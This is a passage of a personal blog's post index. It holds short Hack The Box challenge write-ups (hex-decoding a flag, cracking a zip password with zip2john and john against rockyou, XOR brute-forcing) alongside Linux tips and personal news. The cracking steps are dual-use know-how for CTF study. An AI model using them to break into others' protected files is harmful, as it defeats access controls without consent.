"Challenge description We want to update our website but we are unable to because the developer who coded this left today. Can you take a look?SolutionWen we extract the Canvas.zip we found the nex...", "content": "Challenge description We want to update our website but we are unable to because the developer who coded this left today. Can you take a look?SolutionWen we extract the Canvas.zip we found the next files: css folder js folder dashboard.html index.htmlLet’s take a look at the js folder. There is a login.js file, sounds good. Let’s take a look inside…The file is obfuscate but the last line contains a variable called res… res as in result? It can’t be that easy…var res=String['\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43\\x6f\\x64\\x65'](0x48,0x54,0x42,0x7b,0x57,0x33,0x4c,0x63,0x30,0x6d,0x33,0x5f,0x37,0x30,0x5f,0x4a,0x34,0x56,0x34,0x35,0x43,0x52,0x31,0x70,0x37,0x5f,0x64,0x33,0x30,0x62,0x46,0x75,0x35,0x43,0x34,0x37,0x31,0x30,0x4e,0x7d,0xa);Seems that is in hexadecimal, let’s take the part of the strings between parentheses and check…(0x48,0x54,0x42,0x7b,0x57,0x33,0x4c,0x63,0x30,0x6d,0x33,0x5f,0x37,0x30,0x5f,0x4a,0x34,0x56,0x34,0x35,0x43,0x52,0x31,0x70,0x37,0x5f,0x64,0x33,0x30,0x62,0x46,0x75,0x35,0x43,0x34,0x37,0x31,0x30,0x4e,0x7d,0xa)We clean the string removing the parentheses, the 0x and the commas:4854427b57334c63306d335f37305f4a3456343543523170375f6433306246753543343731304e7daWe check the result converting the string to text.This time I’ll use the hex string converter from codebeautify.And we get our flag!Canvas has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - BabyEncryption pwned!", "url": "/posts/htb-babyencryption/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-05-09 02:00:01 +0200", "snippet": "BabyEncryption has been PwnedEnjoy! ;)", "content": "BabyEncryption has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Eternal Loop pwned!", "url": "/posts/htb-eternal-loop/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, misc, htb, Eternal loop, john, zip2john, rockyou, sqlite3", "date": "2022-05-07 02:00:01 +0200", "snippet": "Description Can you find a way out of this loop?SolutionIf we extract the Eternal Loop.zip file we found the 37366.zip file. This file is password protected and contains the 5900.zip file.We don’t...", "content": "Description Can you find a way out of this loop?SolutionIf we extract the Eternal Loop.zip file we found the 37366.zip file. This file is password protected and contains the 5900.zip file.We don’t know the 37366.zip password… We’ll try with 5900… It works!Now we know that the zip file will be the name of the inner file.Ok, the challenge now is unzip the files until we get the last file. We can do this by hand, but, spoiler alert: There will be 501 zips!To do this I did a self-explained python script that you can see here: eternal_loop.pyOnce we have the last file, surprise, is password protected.This time we have not clue what the password might be, so we’ll bruteforce it.First of all is extract the hash of the zip file. We’ll use zip2johnzip2john 6969.zip &gt; 6969.hashOnce we have the hash we’ll bruteforce it with john using the rockyou.txt filejohn --wordlist=/usr/share/wordlist/rockyou.txt 6969.hashbruteforcing with johnWe get the password, so we can extract the 6969.zip file.Once extracted we have a DoNotTouch file. The file is binary and, if we apply the file command to see what type of file it is, we can see that is a SQlite 3.x database.file commandSo, we have to open the databasesqlite3 DoNotTouchOnce the database is open we can list the tables with the command .tables.tablesAnd we can export the tables data to csv files following the next steps: Configure to display headers Set the output mode.headers on.mode csv And export the data for each table:.output data.csvselect * from table;Now we can grep the csv files looking for the flag.To speed this step up I will tell you that the flag is in the employees table, in the email field for the employee wiht id 69.select Email from employees where EmployeeId = 69;Eternal Loop has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - misDIRection pwned!", "url": "/posts/htb-misdirection/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, misc, htb, misdirection", "date": "2022-05-05 02:00:01 +0200", "snippet": "Description During an assessment of a unix system the HTB team found a suspicious directory. They looked at everything within but couldn’t find any files with malicious intent.SolutionWhen we extr...", "content": "Description During an assessment of a unix system the HTB team found a suspicious directory. They looked at everything within but couldn’t find any files with malicious intent.SolutionWhen we extract the misDIRection.zip whe find the hidden folder .secretThe .secret folder contains a list of subfolders named as the numbers from 0-9 and letters from a-z and A-Z..secret folderEvery each subfolder is empty or contains a empty file named with a number.Let’s suppose that, if the subfolder it’s not empty, the subfolder name will be the character in the flag and the contained file name will be the position on the flag string…When we get the flag string we’ll see that is encoded in base64 so we’ll need to decode it to get the flag.We can solve it by hand but, to automate it, I did a self-explained python script that you can see at secret_finder.pymisDIRection has been PwnedEnjoy! ;)" }, { "title": "Hack the box Deterministic", "url": "/posts/htb-deterministic/", "categories": "hack the box, challenge", "tags": "hack the box, challenge, misc, htb, Deterministic", "date": "2022-05-01 02:00:01 +0200", "snippet": "Challenge description There is a locked door in front of us that can only be opened with the secret passphrase. There are no keys anywhere in the room, only this .txt. There is also a writing on t...", "content": "Challenge description There is a locked door in front of us that can only be opened with the secret passphrase. There are no keys anywhere in the room, only this .txt. There is also a writing on the wall.. “State 0: 69420, State N: 999, flag ends at state N, key length: one”.. Can you figure it out and open the door?SolutionWhen we extract the Deterministic.zip file we only found the deterministic.txt file.If we take a look at the deterministic.txt content, we can see a few things:The states are correct but just for security reasons, each character of the password is XORed with a very super secret key.100 H 110110 T 111111 B 112112 { 113113 l 114114 0 115115 l 116116 _ 117117 n 118118 0 119119 p 120120 e 121121 } 122We can assume that the first column is the current state, the second column is the xored character of the password and the third column is the next state.And the character of the password is xored with a very super secret key with length one (remember the statement) ;)A deterministic system will always produce the same output from a initial state.So, to solve this challenge, the first thing is get the secuence of states, starting from 69420 and ending in 999.Concatenating the characters associated to this states we will have the xored password.Once we got the xored password, we need to bruteforce it with a key o length one (It shouldn’t take long ;)) to get the plaintext password (our flag).Lastly, once we have bruteforced the xored password, we will analyze the ouputs, and we will keep the only one that makes sense (and the only one that has the flag :P).To solve this challenge I did a python script that you can see here: deterministic.pyEnjoy! ;)" }, { "title": "Awesome HTB widget", "url": "/posts/awesome-htb-widget/", "categories": "personal, portfolio", "tags": "personal, portfolio, awesomewm, widget, hack the box, development", "date": "2022-05-01 02:00:01 +0200", "snippet": "I did a simple widget to show the IPs of your VPN interface and your target machine (if is set) while you are playing in hack the box (hackthebox.com)It’s also a good widget to see the IP of your ...", "content": "I did a simple widget to show the IPs of your VPN interface and your target machine (if is set) while you are playing in hack the box (hackthebox.com)It’s also a good widget to see the IP of your VPN interface (and) if the interface is up.Screenshots With target onAwesome htb widget with target on With target offAwesome htb widget with target off If the VPN interface is down the widget is not shown.You can take a look at the widget source code in https://github.com/rubenhortas/awesome-htb-widgetEnjoy! ;)" }, { "title": "Awesome IP widget", "url": "/posts/awesome-ip-widget/", "categories": "personal, portfolio", "tags": "personal, portfolio, awesomewm, widget, development", "date": "2022-04-30 02:00:01 +0200", "snippet": "I did a a simple widget to show the IP of an interface in the awesome window manager wibar.ScreenshotsAwesome ip widgetYou can take a look at the widget source code in https://github.com/rubenhorta...", "content": "I did a a simple widget to show the IP of an interface in the awesome window manager wibar.ScreenshotsAwesome ip widgetYou can take a look at the widget source code in https://github.com/rubenhortas/awesome-ip-widgetEnjoy! ;)" }, { "title": "Hack The Box - APKey pwned!", "url": "/posts/htb-apkey/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-04-20 02:00:01 +0200", "snippet": "APKey has been PwnedEnjoy! ;)", "content": "APKey has been PwnedEnjoy! ;)" }, { "title": "Hack The Box - Don't Overreact pwned!", "url": "/posts/htb-overreact/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-04-17 02:00:01 +0200", "snippet": "jDon’t Overreact has been PwnedEnjoy! ;)", "content": "jDon’t Overreact has been PwnedEnjoy! ;)" }, { "title": "HackTheBox - Cat pwned!", "url": "/posts/htb-cat/", "categories": "hack the box, challenge", "tags": "hack the box, challenge", "date": "2022-04-17 02:00:01 +0200", "snippet": "Cat has been PwnedEnjoy! ;)", "content": "Cat has been PwnedEnjoy! ;)" }, { "title": "Tuning debian performance", "url": "/posts/tuning-debian-performance/", "categories": "debian, performance", "tags": "debian, performance, tuning, gnu/linux", "date": "2017-08-21 02:00:01 +0200", "snippet": "For personal reasons I love tuning the performance of my operating systems.My personal choice is, usually, Debian GNU/Linux.I always part from installing a base system from a netinstall image and t...", "content": "For personal reasons I love tuning the performance of my operating systems.My personal choice is, usually, Debian GNU/Linux.I always part from installing a base system from a netinstall image and then I uninstall some packages that I won’t need.Lastly I change a few things to optmize performance and have a lighter gnu/linux operating system: Don’t install any display manager (kdm, gdm, xdm, ldm…) Install a windows manager instead a desktop environment (my personal prefference now is awesomewm) Reduce swap consumption or disable swap We can edit the swappiness file that controls the trend kernel to swapping (default is 60) (This is my choice for systems where I have swap partitions: desktop, laptops…) # echo 10 &gt; /proc/sys/vm/swappiness We can disable the swapping with swapoff # swapoff -a Disable unused services If we are using systemd we can disable services on boot by running: # systemctl disable service-name Enjoy! ;)" }, { "title": "Prevent phone spam on android 8", "url": "/posts/avoid-spam-android-8/", "categories": "android, spam", "tags": "android, spam", "date": "2017-08-21 02:00:01 +0200", "snippet": "How to prevent unwanted calls and SMS on an android 8 phone without having to install any application?The first thing is create a contact in which we will store the numbers that we want to block (y...", "content": "How to prevent unwanted calls and SMS on an android 8 phone without having to install any application?The first thing is create a contact in which we will store the numbers that we want to block (yes, I will use the original name “SPAM” for the contact).Then we will add the numbers we want to block to the contact:Contact SPAMOnce the contact is created we edit it, and in the hamburger menu, we will select the option “Block contact”:Contact hamburger menuOne the conctact is blocked we won’t receive any calls or messages for these numbers from now on:Contact block question dialogEnjoy! ;)" }, { "title": "Get brightness keys working on GNU/Linux", "url": "/posts/brightness-keys-gnu-linux/", "categories": "gnu/linux, brightness keys", "tags": "gnu/linux, brightbness keys, xdotool", "date": "2015-07-24 02:00:01 +0200", "snippet": "After install a new GNU/Linux distribution on my laptop it was working almost all, but not the brightness key (or brightness buttons).To solve this the solution was install xdotool and assign the c...", "content": "After install a new GNU/Linux distribution on my laptop it was working almost all, but not the brightness key (or brightness buttons).To solve this the solution was install xdotool and assign the commands “xdotool key XF86MonBrightnessUp” and“xdotool key XF86MonBrightnessDown” to the volume keys.Enjoy! ;)" }, { "title": "Python 101 for developers", "url": "/posts/python-101-for-developers/", "categories": "personal, talks", "tags": "personal, talks, python", "date": "2014-12-08 01:00:01 +0100", "snippet": "Coruña Developers (@CorunaDev) is an initiative that has just emerged in A Coruña and aims to be a meeting point for developers. A place where you can talk, discuss and, above all, learn from other...", "content": "Coruña Developers (@CorunaDev) is an initiative that has just emerged in A Coruña and aims to be a meeting point for developers. A place where you can talk, discuss and, above all, learn from other developers with more experience in other areas.Last Friday I had the opportunity to inaugurate the talks with “Python 101 for developers”. The talk is an introduction to Python, skipping basic things, emphasizing, above all, the differences, advantages and disadvantages that Python presents with respect to other programming languages. Leaving for the end certain annotations that I considered necessary, although I could not go deeper into them due to the extension of the topics to which they refer.From here I want to thank the guys from Coruña Developers for the opportunity and the experience (also the treatment received), and the attendees for the interest and curiosity shown. The truth is that for me it has been a very positive experience, and I hope it was productive for the attendees.Although I know that for the non-attendees the slides and examples may be too short, by consensus with the organization and the attendees, I have decided to upload the material used (slides and code examples). While the services that will serve as common points to host all the material generated by the Coruña Developers project are being created, I have uploaded the slides and examples used to my github account.For non-attendees, this documentation may be short because it is out of context. Since it is simply support material (brief notes and simple examples) for the talk. Material that serves to provide structure, consistency and an argumentative thread to the narration. Material that, due to its format, leaves out certain topics and nuances that are commented on during the talk. However, it may still be of interest.Personally, and after talking with the organizers about the ideas they have, I think it is a very interesting initiative. I am sure I will be there in future occasions, initially as an attendee, but who knows! Maybe in the future I will have the opportunity to repeat as a speaker ;)You can follow the activities of Coruña Developers on their facebook page: https://www.facebook.com/groups/CorunaDevelopers and/or on their twitter: @CorunaDevEnjoy! ;)" }, { "title": "In La brecha again", "url": "/posts/in-la-brecha-again/", "categories": "personal, mentions", "tags": "personal, mentions, wifi, security", "date": "2014-03-13 01:00:01 +0100", "snippet": "I’m pleased to announce that, again, I’m in La brecha.This time with my PFC (Proyecto Final de Carrera or Final Career Project) “Sistema de monitorización de redes WI-FI” (WI-FI network monitoring ...", "content": "I’m pleased to announce that, again, I’m in La brecha.This time with my PFC (Proyecto Final de Carrera or Final Career Project) “Sistema de monitorización de redes WI-FI” (WI-FI network monitoring system).A job that integrates both the world of systems and software development in a totally friendly environment for monitoring and detecting anomalies in WIFI networks.My most sincere thanks to Nino and Fran for the work done and for being the best director and the best tutor I could have had.Enjoy! ;)" }, { "title": "SSH without password, using RSA keys", "url": "/posts/ssh-without-password-using-rsa-keys/", "categories": "hardening, ssh", "tags": "hardening, ssh, security, rsa, networking", "date": "2013-09-15 02:00:01 +0200", "snippet": "Suppose we have two computers: computer1 with ip 10.0.0.1 and computer2 with ip 10.0.0.2.We connect very frequently from computer1 to computer2 using SSH.As we connect very frequently, entering the...", "content": "Suppose we have two computers: computer1 with ip 10.0.0.1 and computer2 with ip 10.0.0.2.We connect very frequently from computer1 to computer2 using SSH.As we connect very frequently, entering the password every time we connect becomes a repetitive task and a waste of time.In order to be able to connect between them without password, in a comfortable and secure way, we can do it using RSA keys instead.Connection between computersTo be able to connect via SSH using the RSA keys instead password:We generate the public and private RSA keys on computer1:rubenhortas@computer1:~/.ssh$ ssh-keygen -t rsaGenerating public/private rsa key pair.Enter file in which to save the key (/home/rubenhortas/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /home/rubenhortas/.ssh/id_rsa.Your public key has been saved in /home/rubenhortas/.ssh/id_rsa.pub.The key fingerprint is:**:**:**:**:**:**:**:**:**:**:**:**:**:**:**:**The key's randomart image is:*You have to leave the passphrase empty, otherwise it will ask for it every time we connect to computer2 via SSHWe copy the public key from computer1 to computer2:rubenhortas@computer1$ ssh-copy-id -i ~/.ssh/id_rsa.pub 10.0.0.2The authenticity of host '10.0.0.2 (10.0.0.2)' can't be established.RSA key fingerprint is **:**:**:**:**:**:**:**:**:**:**:**:**:**:**:**.Are you sure you want to continue connecting (yes/no)? yes/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysrubenhortas@10.0.0.2's password:Finally, we connect from computer1 to computer2 using SSH and checking that it does not ask us for the password.Enjoy! ;)" }, { "title": "Seguridad Jabali", "url": "/posts/seguridad-jabali/", "categories": "personal, mentions", "tags": "personal, mentions, security", "date": "2012-04-15 02:00:01 +0200", "snippet": "I’m pleased to announce that I’m the recomendation of today in Seguridad Jabali (es).Seguridad Jabali (es) it’s a great blog about computer security which deals with many interesting topics. The bl...", "content": "I’m pleased to announce that I’m the recomendation of today in Seguridad Jabali (es).Seguridad Jabali (es) it’s a great blog about computer security which deals with many interesting topics. The blog is written by Angel A. Núñez, a great colleague and a better person.Thanks for everything, Angel!Enjoy! ;)" }, { "title": "In La brecha", "url": "/posts/in-la-brecha/", "categories": "personal, mentions", "tags": "personal, mentions, security", "date": "2011-02-12 01:00:01 +0100", "snippet": "I’m pleased to announce that, as of today, I’m in La brecha with my post “saltarse el bloqueo a internet” (es).La brecha is a new section on the psi-udc blog, managed by Nino, one of my “top 3 teac...", "content": "I’m pleased to announce that, as of today, I’m in La brecha with my post “saltarse el bloqueo a internet” (es).La brecha is a new section on the psi-udc blog, managed by Nino, one of my “top 3 teachers”, both for his knowledge, his way of teaching, and as a person.This section is dedicated to references related to the world of security maintained by FIC students.Enjoy! ;)" }, { "title": "GIFAR, another steganography trick", "url": "/posts/gifar-steganography-trick/", "categories": "steganography, gifar", "tags": "steganography, gifar, cryptography", "date": "2010-03-29 02:00:01 +0200", "snippet": "Since -relatively- recently, it has become more and more common to find articles about steganography, until “recently” that great unknown. The vast majority of these articles talk about application...", "content": "Since -relatively- recently, it has become more and more common to find articles about steganography, until “recently” that great unknown. The vast majority of these articles talk about applications, whether known or new, and how we can hide one type of file inside another.In the article GIFAR otro “steganography trick” (es), they talk about a technique that allows us to hide .jar files inside .gif and .pdf files, and how an attacker could exploit this technique presented at BlackHat US ‘08, one of the most important security events in the world.Enjoy! ;)" }, { "title": "Run mplayer on another computer via ssh", "url": "/posts/mplayer-via-ssh/", "categories": "gnu/linux, mplayer", "tags": "mplayer, ssh", "date": "2008-08-27 02:00:01 +0200", "snippet": "Let’s suppose we are using a computer A which is a laptop and we are lying in bed and for some reason we want to watch a video on another computer B which is our desktop and is located elsewhere an...", "content": "Let’s suppose we are using a computer A which is a laptop and we are lying in bed and for some reason we want to watch a video on another computer B which is our desktop and is located elsewhere and is only accessible via ssh. How can we watch a video (in this case in full screen) on the computer B?Once connected via ssh we run:$ DISPLAY=:0 mplayer -fs videoEnjoy! ;)" }, { "title": "Como atraer a un usuario normal hacia linux", "url": "/posts/atraer-usuario-linux/", "categories": "personal, mentions", "tags": "personal, mentions, gnu/linux", "date": "2008-06-25 02:00:01 +0200", "snippet": "Today I’m featured in an opinion article in ionlitio (es): “Como atraer a un usuario normal hacia Linux”It’s an article in which q256 (a great friend of mine IRL) explains how a non gnu/linux user ...", "content": "Today I’m featured in an opinion article in ionlitio (es): “Como atraer a un usuario normal hacia Linux”It’s an article in which q256 (a great friend of mine IRL) explains how a non gnu/linux user sees the various types of gnu/linux users and their use of the system. I’m in the role of “hardcore user”, and although I don’t share all his opinions, I respect and appreciate them. And I thank him (really) for making me one of the protagonist of one of his articles.Thanks, q256!Enjoy! ;)" } ]
